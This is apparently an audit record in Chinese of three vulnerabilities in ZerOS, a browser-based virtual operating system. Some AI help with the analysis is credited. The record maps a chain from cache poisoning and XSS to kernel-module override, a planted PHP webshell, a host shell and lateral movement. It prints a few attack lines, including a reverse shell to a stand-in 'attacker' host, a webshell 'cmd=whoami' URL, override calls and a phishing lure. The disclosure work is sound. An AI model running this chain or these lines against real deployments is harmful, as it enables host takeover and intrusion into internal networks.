# ZerOS 安全审计记录 — 2026-07-27

> **审计者**: 小萱baibai  
> **分析协助**: opencode / deepseek-v4-pro  
> **目标项目**: ZerOS (https://github.com/anomalyco/opencode 相关, 浏览器端虚拟操作系统)  
> **产出**: 3 份新漏洞报告 (CVS-ZEROS-024 / 025 / 026)

---

## 一、发现起点

审计者在检查项目文档与代码对齐过程中，注意到 ZerOS 的缓存系统 (CacheDrive) 以 **程序名 (programName)** 而非 PID 作为缓存命名空间键。进一步追踪发现：

- `cacheDrive.js` 中 `_getProgramNameFromPid()` 从进程表 `PROCESS_TABLE` 查 `pid → programName`
- 程序名在进程启动时设定 (`processManager.js:1483`)
- 终端通过 `tempAsset` 机制加载外部文件时，程序名直接取自**文件名去扩展名** (`terminal.js:9094-9095`)

审计者直觉判断：若构造与系统程序同名的外部文件，可通过进程名冲突获取该程序缓存空间的完整读写权。

---

## 二、漏洞发现与验证过程

### 2.1 CVS-ZEROS-024: tempAsset 程序名冲突 → 缓存命名空间劫持

**核心链路**：

```
文件名 "settings" (无扩展名)
  → terminal.js: programNameFromPath = "settings"
  → processManager.js: startProgram("settings", { tempAsset })
  → 进程表注册 programName: "settings"
  → Cache API 调用 → _getProgramNameFromPid → "settings"
  → 获得合法 settings 应用的缓存命名空间读写权
```

**关键漏洞点**：

| 文件:行 | 问题 |
|---------|------|
| `pool.js:135` | `__ADD__` 裸赋值 `obj[name] = elem`, 无重复键检查 |
| `processManager.js:1234-1239` | tempAsset 分支跳过 APPLICATION_ASSETS, 不校验名称冲突 |
| `processManager.js:1481-1483` | 进程信息以外部传入的 programName 注册 |
| `processManager.js:1593` | tempAsset 通过 `<script>` 标签注入全局作用域, 无隔离 |
| `processManager.js:1640-1696` | 等待循环无加载前后快照比对 |
| `terminal.js:9094-9095` | 程序名直接从文件名推导 |
| `cacheDrive.js:192-203` | `_getProgramNameFromPid` 无条件返回 |
| `cacheDrive.js:1020-1086` | 缓存以 programName 为命名空间写入 |

**扩展发现：全局对象与 POOL 签名劫持**

当目标程序**已在运行时**，同名 tempAsset 不仅劫持缓存，还能覆盖 `window[UPPER]` 和 POOL 中的程序类注册：

```
window.SETTINGS = EvilSettingsClass;           // 覆盖全局
POOL.__ADD__('APPLICATION_SHARED_POOL', 'SETTINGS', EvilSettingsClass);  // 覆盖 POOL
→ POOL→window 交叉同步 (processManager.js:1666,1679) 确保双向污染
```

受影响二级查找点：`startProgram` / `killProgram.__exit__` / `getProgramInfo` / `ContextMenuManager` / `terminal.js`

**CVSS**: 7.7 (高), 含扩展攻击面后 7.8

---

### 2.2 CVS-ZEROS-025: POOL.__ADD__ 零访问控制 → 内核模块全局劫持

**核心发现**：

`pool.js:108-136` — `__ADD__` 方法无任何访问控制：
- 无 PID 验证
- 无权限检查
- 无调用栈分析
- 无调用方白名单/黑名单
- 唯一的"保护"：`Object.freeze(POOL)` (line 341), 仅防方法替换, 不防数据写入

`KERNEL_GLOBAL_POOL` 中注册了 **50+ 个内核模块**，包括：
- `ProcessManager` — 进程管理
- `PermissionManager` — 权限裁决
- `UserControl` — 用户认证
- `MemoryManager` / `KernelMemory` — 内存管理
- `CacheDrive` / `LStorage` / `CryptDrive` — 存储与加密
- `GUIManager` / `TaskbarManager` / `NotificationManager` — UI 管理
- `NetworkManager` — 网络通信
- `EventManager` — 事件总线
- `LockScreen` — 锁屏认证

**任何代码均可直接调用** `POOL.__ADD__("KERNEL_GLOBAL_POOL", "PermissionManager", fakePM)` 静默覆盖。

**三条独立攻击链**：

| 链 | 路径 | 依赖 |
|----|------|------|
| A | tempAsset → `POOL.__ADD__("KERNEL_GLOBAL_POOL", ...)` 直接覆盖 | 024 |
| B | Cache 投毒 → LockScreen XSS → `POOL.__ADD__` + EXPLOIT_PID 上下文覆盖 | 023 + 025 |
| C | 覆盖 TaskbarManager/ProcessManager → 恶意进程在所有管理界面隐身 | 023/024 + 025 |

**CVSS**: 9.3 (严重), 若结合 024 绕过 UI 交互可达 9.8

---

### 2.3 CVS-ZEROS-026: 完整 APT 攻击链 —— 虚拟 OS → 宿主机 Shell → 内网横向

**六阶段完整杀伤链**：

```
阶段1: ZerOS 内核劫持
  普通应用(CACHE_WRITE)
  → Cache 投毒 system.dailyQuote → 锁屏 innerHTML XSS
  → EXPLOIT_PID 提权
  → POOL 覆盖 PermissionManager → 全局权限豁免
  → 完整内核控制 ✓

阶段2: 持久化载荷植入
  内核控制权(SERVER_SERVICE_PID=10000)
  → FSDirve.php 写入 D:/server/server-backdoor.js
  → ServerExpansion 自动 <script> 加载
  → 重启后自动恢复 ✓

阶段3: NetworkManager 代理突破
  劫持 NetworkManager
  → networkDirve.php 绑定 0.0.0.0:{port}
  → popen 启守护进程
  → 攻击者 Kali 建立反向连接 ✓

阶段4: PHP Webshell 写入
  → Network.Port.send → FSDirve.php write_file
  → 写入 D:/server/evil.php 到真实宿主机文件系统
  → http://host:8089/.../evil.php?cmd=whoami ✓

阶段5: 宿主机 Shell
  → nodeLibExec.php: proc_open("node", bypass_shell=true)
  → Node 子进程完整宿主机文件系统/网络权限
  → 反向 Shell (bash -i >& /dev/tcp/attacker/4444) ✓

阶段6: 内网横向 + WAF 绕过
  → 宿主机 nmap 内网扫描
  → 对发现的 ZerOS 实例复用 023/024/025 攻击
  → 非 ZerOS 系统使用传统渗透工具
  → 攻击流量来自内网受信主机, WAF 无法检测 ✓
```

**NodeLib 无痕执行桥（关键环节）**：

| 要素 | 状态 |
|------|------|
| PHP 审计日志 (nodeLibExec/Init.php) | **零** — 无 error_log, 无审计记录 |
| JS 动作日志 | 可通过 server-perflog 模式禁用 |
| JWT 认证 | NetworkManager 基于调用栈 regex 自动注入 SystemToken |
| Node 子进程隔离 | 无 — 可访问宿主机完整文件系统 |
| 持久化 | ServerExpansion 每次启动自动加载 D:/server/server-*.js |
| 完整性校验 | 无 — 无签名, 无哈希, 无 manifest |
| SERVER_SERVICE_PID | 10000 (与 EXPLOIT_PID 同值), 全部危险权限无条件放行 |

**CVSS**: 9.8 (严重)

---

## 三、漏洞关联图

```
                    ┌──────────────────────────────────────┐
                    │         CVS-ZEROS-026 (9.8)          │
                    │         完整 APT 攻击链               │
                    │   ┌──────────────────────────────┐   │
                    │   │     CVS-ZEROS-025 (9.3)      │   │
                    │   │   POOL 零访问控制            │   │
                    │   │  ┌────────────────────────┐  │   │
                    │   │  │  CVS-ZEROS-024 (7.7)   │  │   │
                    │   │  │  缓存命名空间劫持       │  │   │
                    │   │  │  ┌──────────────────┐  │  │   │
                    │   │  │  │  CVS-ZEROS-023    │  │  │   │
                    │   │  │  │  Cache投毒+XSS    │  │  │   │
                    │   │  │  │  (已有, 待修复)   │  │  │   │
                    │   │  │  └──────────────────┘  │  │   │
                    │   │  └────────────────────────┘  │   │
                    │   └──────────────────────────────┘   │
                    │                                      │
                    │   + NetworkManager (0.0.0.0 bind)    │
                    │   + NodeLib (proc_open → 宿主机)     │
                    │   + D/server 自动加载 (持久化)       │
                    │   + server-zeroshub (预埋远程桥)     │
                    └──────────────────────────────────────┘
```

---

## 四、影响评估

### 对 ZerOS 项目

- **025 是地基裂缝** — PermissionManager、ProcessManager、UserControl 等所有之前的 CVE 修复都可能被 POOL 入口绕过
- **026 是完整的攻击链剧本** — 从低权限应用到宿主机完全控制的每一步都有代码支撑
- **024 暴露了 tempAsset 设计的根本性信任缺陷** — 程序名作为身份标识但来源不可信

### 对实际部署

| 部署形态 | 影响 |
|---------|------|
| 本地开发 (localhost) | 可控 — 需本地物理访问 |
| 公开 Web 服务 | **严重** — 任何访客的浏览器 JS 可通过链获取宿主机 Shell |
| 多用户 SaaS | **灾难** — 用户间隔离完全失效 |
| 企业内网部署 | **高危** — 单点沦陷 = 全网沦陷 |
| 搭配钓鱼攻击 | **极高** — 参见第五节 |

---

## 五、钓鱼攻击场景

被控的 ZerOS 实例相当于一个**浏览器代理框架 (BeEF 级别)**：

- 受害者浏览器可扫描内网（躲在 corp network 后面）
- 可打同源 CSRF 摸同域名下其他服务
- 持久化 payload 在页面重新打开后自动恢复
- 钓鱼邮件标题："您的云办公平台已就绪，点击登录"
- 受害者不仅自己进来了，还帮攻击者把公司内网的门打开了

---

## 六、产出文件

| 文件 | 内容 |
|------|------|
| `VULN/CVS_ZEROS_024.md` | tempAsset 程序名冲突 → 缓存命名空间劫持 + 全局签名劫持 |
| `VULN/CVS_ZEROS_025.md` | POOL.__ADD__ 零访问控制 → 内核模块全局劫持 |
| `VULN/CVS_ZEROS_026.md` | 完整 APT 攻击链 → 宿主机 Shell + 内网横向  |
| `VULN/README.md` | 统计与列表已更新至 26 个漏洞 |

---

## 七、关键代码位置索引

| 文件 | 关键行 | 问题 |
|------|--------|------|
| `kernel/core/signal/pool.js` | 135 | `__ADD__` 零访问控制裸赋值 |
| `kernel/core/signal/pool.js` | 341 | Object.freeze 仅防方法替换 |
| `kernel/process/processManager.js` | 1234-1239 | tempAsset 跳过 APPLICATION_ASSETS |
| `kernel/process/processManager.js` | 1483 | 进程表以外部传入 programName 注册 |
| `kernel/process/processManager.js` | 1593 | tempAsset 全局作用域 script 注入 |
| `kernel/process/processManager.js` | 1640-1696 | 等待循环无快照比对 |
| `kernel/process/processManager.js` | 1666,1679 | POOL→window 交叉同步 |
| `kernel/process/processManager.js` | 6175-6187 | Cache.set 允许覆盖 options.pid/programName |
| `kernel/process/processManager.js` | 10 | SERVER_SERVICE_PID = 10000 |
| `kernel/process/permissionManager.js` | 797-803 | EXPLOIT_PID 无条件放行全部权限 |
| `kernel/drive/cacheDrive.js` | 192-203 | `_getProgramNameFromPid` 无条件返回 |
| `kernel/drive/cacheDrive.js` | 1020-1086 | programName 优先, 无命名空间校验 |
| `kernel/drive/cacheDrive.js` | 1726-1731 | `window.CacheDrive` 绕过权限系统 |
| `kernel/drive/networkManager.js` | 265-282 | JWT 类型基于调用栈 regex 判断 |
| `system/expansion/serverExpansion.js` | 119-122 | D/server 自动加载无完整性校验 |
| `system/expansion/serverExpansion.js` | 491-492 | 每次启动触发 |
| `system/service/networkDirve.php` | 247 | TCP 绑定 0.0.0.0 (全接口) |
| `system/service/networkDirve.php` | 132 | popen 启动守护进程 |
| `system/service/nodeLibExec.php` | 54-61 | proc_open 执行 Node (bypass_shell:true) |
| `system/service/nodeLibInit.php` | 48-72 | proc_open 执行 npm (bypass_shell:false) |
| `system/service/FSDirve.php` | 1310-1332 | file_put_contents 直接写宿主机 FS |
| `system/service/nodeLibExec.php` | 全部 | 零审计日志 |
| `system/service/DISK/D/server/server-zeroshub.php` | 8 | 预埋远程桥接占位 token |
| `system/ui/lockscreen.js` | 269 | 缓存数据 → innerHTML (XSS sink) |
| `dev/zeroshub/server/server-perflog.js` | 28-45 | 可禁用全部动作日志 |
| `.htaccess` | 14 | Access-Control-Allow-Origin: * |
| `system/service/DISK/D/application/terminal/terminal.js` | 9094-9095 | 程序名从文件名推导 |
| `system/service/DISK/D/application/terminal/terminal.js` | 9110-9129 | tempAsset 以文件名启动 |

---

> **生成时间**: 2026-07-27  
> **审计者**: 小萱baibai  
> **分析协助**: opencode / deepseek-v4-pro  
> **项目**: ZerOS 浏览器端虚拟操作系统
